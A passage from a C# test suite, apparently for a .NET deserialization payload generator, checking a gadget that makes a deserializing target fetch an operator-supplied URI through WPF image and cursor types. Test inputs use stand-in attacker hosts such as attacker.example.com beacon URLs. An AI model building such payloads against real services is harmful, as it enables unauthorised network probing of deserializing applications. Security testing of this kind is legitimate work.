                        AssertTrue(text.IndexOf(otherMember, StringComparison.Ordinal) < 0,
                            cell + ": and not the other variant's member");
                    }
        }

        private static void XamlTypeConverterFetchRefusesImpossibleFormatters()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(XtcGadget);

            foreach (string formatter in XtcImpossibleFormatters)
            {
                AssertTrue(!gen.IsSupported(formatter), formatter + " is not advertised");
                XtcAssertThrowsWith(
                    () => BuildXtcPayload(formatter, XtcInput("http://h/x.cur", false)),
                    "not supported",
                    formatter + " is refused by name rather than emitted");
            }

            // Nothing outside the advertised list is quietly buildable either.
            int checkedCount = 0;
            foreach (FieldInfo f in typeof(Formatters).GetFields(
                BindingFlags.Public | BindingFlags.Static))
            {
                string formatter = (string)f.GetValue(null);
                if (string.IsNullOrEmpty(formatter) || gen.IsSupported(formatter))
                    continue;
                checkedCount++;
            }
            AssertEqual(XtcImpossibleFormatters.Length, checkedCount,
                "the unsupported set is exactly the recorded exclusions");
        }

        private static void XamlTypeConverterFetchTakesTheUriAsTyped()
        {
            string[] uris =
            {
                "http://attacker.example.com/beacon.cur",
                "https://attacker.example.com:8443/a/b.cur?c=d&e=f",
                @"\\attacker.example.com\share\x.cur",
                "file:///C:/Program Files/Example/x.cur",
                "gopher://attacker.example.com/1.cur",
            };

            foreach (int variant in new[]
            {
                XamlTypeConverterFetchGenerator.VariantImageSource,
                XamlTypeConverterFetchGenerator.VariantCursor,
            })
                foreach (string uri in uris)
                    AssertTrue(BuildXtcPayload(Formatters.Xaml,
                            XtcVariantInput(variant, uri, false)) != null,
                        "variant " + variant + " delivers \"" + uri + "\" as typed");

            // The ampersand is the one character an XML attribute cannot carry raw, and the
            // escaper handles it rather than the guard refusing it.
            string escaped = (string)BuildXtcPayload(Formatters.Xaml,
                XtcInput("http://h/x?a=1&b=2", false));
            AssertTrue(escaped.IndexOf("a=1&amp;b=2", StringComparison.Ordinal) >= 0,
                "an ampersand is escaped for the attribute: " + Truncate(escaped, 200));

            string raw = (string)BuildXtcPayload(Formatters.Xaml,
                XtcInput("http://h/x?a=1&amp;b=2", false,
                    "--" + XamlTypeConverterFetchGenerator.RawInputOptionName));
            AssertTrue(raw.IndexOf("http://h/x?a=1&amp;b=2", StringComparison.Ordinal) >= 0,
                "--rawinput puts the text into the template untouched");
            AssertTrue(raw.IndexOf("&amp;amp;", StringComparison.Ordinal) < 0,
                "and does not escape it a second time");

            XtcAssertThrowsWith(
                () => BuildXtcPayload(Formatters.Xaml, XtcInput("", false)),
                "non-empty",
                "an empty URI is refused, because there is nothing to build a payload around");
        }

        // Two document families, so two measured answers - and the XAML one is the case where
        // "drop --minify" is a DEAD END, because attribute-value normalization happens on the
        // target's parser too. Getting that wrong is the defect a sibling module shipped once,
        // so the advice is re-checked against a second build by the shared helper below.
        private static void XamlTypeConverterFetchRefusesLossyMinification()
        {
            string doubleSpace = "http://h/two  spaces/x.cur";
            string semi = "http://h/a; b/x.cur";
            string tab = "http://h/a\tb";
            string cr = "http://h/a\rb";
            string lf = "http://h/a\nb";

            // formatter, value, refuse-without-minify, refuse-with-minify
            var rows = new List<string[]>();

            // Xaml carries the value in an ATTRIBUTE: a tab, carriage return and line feed are
            // normalized to a space by every parser, with or without the minifier.
            rows.Add(new[] { Formatters.Xaml, doubleSpace, "ok", "ok" });
            rows.Add(new[] { Formatters.Xaml, semi, "ok", "ok" });
            rows.Add(new[] { Formatters.Xaml, tab, "refuse", "refuse" });
            rows.Add(new[] { Formatters.Xaml, cr, "refuse", "refuse" });
            rows.Add(new[] { Formatters.Xaml, lf, "refuse", "refuse" });

            // The shared escaper makes every control character valid JSON before the minifier
            // re-reads it, so the two JSON documents preserve all five measured values.
            foreach (string f in new[] { Formatters.JsonNet, Formatters.JavaScriptSerializer })
            {
                rows.Add(new[] { f, doubleSpace, "ok", "ok" });
                rows.Add(new[] { f, semi, "ok", "ok" });
                rows.Add(new[] { f, tab, "ok", "ok" });
                rows.Add(new[] { f, cr, "ok", "ok" });
                rows.Add(new[] { f, lf, "ok", "ok" });
            }

            // YamlDotNet uses the same control-character escaper. Its repeated-space collapse
            // remains the only measured loss here.
            rows.Add(new[] { Formatters.YamlDotNet, doubleSpace, "ok", "refuse" });
            rows.Add(new[] { Formatters.YamlDotNet, semi, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, tab, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, cr, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, lf, "ok", "ok" });

            var failures = new List<string>();
            foreach (int variant in XtcVariants)
                foreach (string[] row in rows)
                    foreach (bool minify in new[] { false, true })
                    {
                        bool mustRefuse = string.Equals(row[minify ? 3 : 2], "refuse",
                            StringComparison.Ordinal);
                        string cell = row[0] + " variant " + variant + (minify ? " +minify" : "")
                            + " with " + Truncate(row[1].Replace("\r", "\\r")
                                .Replace("\n", "\\n").Replace("\t", "\\t"), 40);

                        bool refused = false;
                        string message = null;
                        try { BuildXtcPayload(row[0], XtcVariantInput(variant, row[1], minify)); }
                        catch (Exception e) { refused = true; message = e.Message; }

                        if (refused != mustRefuse)
                        {
                            failures.Add(cell + " -> "
                                + (refused ? "refused: " + message : "delivered")
                                + ", wanted " + (mustRefuse ? "a refusal" : "delivery"));
                            continue;
                        }
                        if (refused
                            && message.IndexOf("fetch a different location",
                                StringComparison.Ordinal) < 0)
                            failures.Add(cell + " -> refused with the wrong message: " + message);
                    }

            AssertTrue(failures.Count == 0,
                "minify fidelity cells disagreed with the measured table (" + failures.Count
                    + "):\n  " + string.Join("\n  ", failures.ToArray()));

            // THE ADVICE IS CHECKED AGAINST A SECOND BUILD, through the same shared helper the
            // catalogue-wide sweep uses (that sweep splices hostile runs into a generic sample
            // value, so the measured cells below are driven here). It is doing real work: the Xaml
            // refusal must NOT promise that dropping --minify helps, while the other three must.
            var adviceProblems = new List<string>();
            int adviceInspected = 0;
            foreach (string[] row in rows)
            {
                bool inspected;
                string problem = MinifyAdviceProblem(XtcGadget, row[0], row[1],
                    "with " + Truncate(row[1].Replace("\r", "\\r").Replace("\n", "\\n")
                        .Replace("\t", "\\t"), 40), out inspected);
                if (inspected) adviceInspected++;
                if (problem != null) adviceProblems.Add(problem);
            }
            AssertTrue(adviceInspected > 0,
                "the advice check really exercised some refusals (was " + adviceInspected + ")");
            AssertTrue(adviceProblems.Count == 0,
                "refusal advice sends the operator somewhere that does not work ("
                    + adviceProblems.Count + "):\n  "
                    + string.Join("\n  ", adviceProblems.ToArray()));

            XtcAssertThrowsWith(
                () => BuildXtcPayload(Formatters.Xaml, XtcInput(tab, true)),
                "dropping --minify would not help",
                "the Xaml refusal does not send the operator down a dead end");
            XtcAssertThrowsWith(
                () => BuildXtcPayload(Formatters.YamlDotNet, XtcInput(doubleSpace, true)),
                "Drop --minify",
                "the YamlDotNet refusal offers the fix that really works there");

            AssertTrue(BuildXtcPayload(Formatters.Xaml, XtcInput(tab, true,
                    "--" + XamlTypeConverterFetchGenerator.RawInputOptionName)) != null,
                "--rawinput builds even when the text would not survive, because the operator "
                    + "owns it");

            foreach (string formatter in XtcFormatters)
                AssertTrue(BuildXtcPayload(formatter,
                        XtcInput("http://attacker.example.com/x.cur", true)) != null,
                    formatter + " still delivers an ordinary URI with --minify");
        }

        private static void XamlTypeConverterFetchIsNotResolvedAtGenerationTime()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch quiet generation"))
                return;

            using (var server = new LegacyXmlHttpServer())
            {
                string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantCursor);
                server.Serve(path, XtcResponseBody, "application/octet-stream");

                foreach (string formatter in XtcFormatters)
                    foreach (int variant in XtcVariants)
                        foreach (bool minify in new[] { false, true })
                            AssertTrue(BuildXtcPayload(formatter,
                                    XtcVariantInput(variant, server.UrlFor(path), minify)) != null,
                                formatter + " variant " + variant + " built a payload");

                AssertTrue(server.WaitForRequest(path, 750) == null,
                    "generation alone made no request, so -t is the only thing that fetches");
            }
        }

        private static void XamlTypeConverterFetchEditsInteractively()
        {
            AssertTrue(Has(new Wizard(null, new MemoryStream(), false).VisibleGadgetNames(),
                    XtcGadget),
                "the wizard offers it with no flag at all");
            AssertTrue(Has(new Wizard(null, new MemoryStream(), true).VisibleGadgetNames(),
                    XtcGadget),
                "and --prv neither hides nor duplicates it");

            var editor = new ModuleEditor(null, null, true, null, null, true);
            var fields = editor.BuildFieldsForTest(XtcGadget);

            EditableField command = FindEditable(fields, "command");
            AssertTrue(command != null, "the editor offers the command setting");

            // The field's LABEL is "test locally", which is what the operator reads. Hidden is
            // what decides whether the toggle is really offered: the field is in every gadget's
            // list, so a non-null check on its own proves nothing.
            EditableField test = FindEditable(fields, "test locally");
            AssertTrue(test != null && !test.Hidden,
                "and the self-test toggle, because -t is accepted for this gadget");

            // The variant option's help opens with "Choices: 1, 2. Default: "1"." so the shared
            // heuristic builds a real picker rather than a menu of prose fragments, and the
            // quoted default is the documented way of saying "this whole string is the value".
            EditableField variant = FindEditable(fields,
                XamlTypeConverterFetchGenerator.VariantOptionName);
            AssertTrue(variant != null && !variant.Hidden, "the editor offers the variant setting");
            AssertTrue(variant.Choices != null && variant.Choices.Count == 2,
                "as a two-value picker: "
                    + (variant.Choices == null ? "<none>"
                        : string.Join(" | ", variant.Choices.ToArray())));

            EditableField raw = FindEditable(fields,
                XamlTypeConverterFetchGenerator.RawInputOptionName);
            AssertTrue(raw != null && !raw.Hidden, "the editor offers the rawinput setting");
            AssertTrue(raw.Choices == null || raw.Choices.Count == 0,
                "and does not turn its prose into a choice menu: "
                    + (raw.Choices == null ? "" : string.Join(" | ", raw.Choices.ToArray())));

            const string editorUri = "http://attacker.example.com/beacon.cur";
            command.Value = editorUri;
            string line = editor.GadgetCommandLineForTest();
            AssertTrue(line.IndexOf(XtcGadget, StringComparison.Ordinal) >= 0,
                "the echoed command line names the gadget: " + line);
            AssertTrue(line.IndexOf("--" + XamlTypeConverterFetchGenerator.RawInputOptionName,
                    StringComparison.Ordinal) < 0,
                "and does not emit --rawinput while it is off: " + line);

            // AND THE PAYLOAD. The editor pre-fills the variant from the option help, so this is
            // where a mis-parsed "Default:" would ship a different payload than the identical CLI
            // command - the exact defect a sibling module shipped once.
            List<string> emitted = editor.GadgetExtraArgvForTest();
            foreach (string formatter in XtcFormatters)
            {
                RunResult viaEditor = GenerateWithExtraArgs(XtcGadget, formatter, editorUri,
                    emitted ?? new List<string>());
                RunResult plain = GenerateWithExtraArgs(XtcGadget, formatter, editorUri,
                    new List<string>());

                AssertTrue(viaEditor.Success, formatter
                    + ": the editor's own arguments generate: " + viaEditor.ErrorMessage);
                AssertTrue(plain.Success, formatter
                    + ": generating with no options works: " + plain.ErrorMessage);
                AssertEqual((string)plain.Raw, (string)viaEditor.Raw, formatter
                    + ": the editor's defaults build the same payload as no options at all "
                    + "(editor emits: " + string.Join(" ",
                        (emitted ?? new List<string>()).ToArray()) + ")");
            }

            AssertInfoPanelKeepsItsFacts(XtcGadget);
        }

        private static void XamlTypeConverterFetchDeclaresRealFacets()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(XtcGadget);

            AssertEqual(CommandInputType.Url, gen.CommandInput(),
                "-c is a URI only the TARGET opens");

            GadgetFacetSet facets = gen.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
                "fetching the operator's URI is a network effect");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.Uncategorized), "no uncategorized kind");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.CodeExecution),
                "the reply goes to an image decoder or the cursor parser, so no code-execution "
                    + "claim");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.InformationDisclosure),
                "nothing is recovered to the operator, so no disclosure claim");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.NestedDeserialization),
                "the reply is never handed to another deserializer");
            AssertTrue(!facets.Requirements.Contains(GadgetRequirement.Uncategorized),
                "the requirements are real");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "PresentationCore ships with the .NET Framework redistributable");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf),
                "and the carriers are WPF types");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.NetFramework),
                "the family the effect is reproduced on is declared");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.ModernDotNet),
                "and modern .NET too, measured by the separate net10.0-windows harness");
            AssertTrue(facets.Inputs == null,
                "the input axis is left derived, so no unproven input form is claimed");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the loopback fetch is observed on");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.Net100),
                "and 10.0 is the build the net10.0-windows harness observes it on");
            AssertEqual(2, facets.Versions.Count,
                "and nothing in between is claimed: two measured endpoints, not a span");

            AssertTrue(gen.Labels().Contains(GadgetTags.Independent),
                "an independent gadget: it owns its whole chain");
            AssertTrue(!string.IsNullOrEmpty(gen.AdditionalInfo()), "it explains itself");
            AssertTrue(gen.AdditionalInfo().Length < 260,
                "briefly, so the interactive info panel still shows the formatter and category "
                    + "lines");
            // The honesty clause: remote image loading is documented WPF behaviour, and the
            // module says so where an operator will read it.
            AssertTrue(gen.AdditionalInfo().IndexOf("documented", StringComparison.OrdinalIgnoreCase) >= 0,
                "and says plainly that the behaviour is documented rather than novel: "
                    + gen.AdditionalInfo());
            AssertTrue(!string.IsNullOrEmpty(gen.Finders()), "the credit is filled in");
        }
    }

    // The shape MessagePack Typeless needs for the formatter audit: a member called Source that
    // the type swap renames onto System.Windows.Controls.Image. It exists only so the audit can
    // ask MessagePack the same question every other format is asked.
    public sealed class XtcImageSurrogate
    {
        public string ImageSource { get; set; }
    }
}
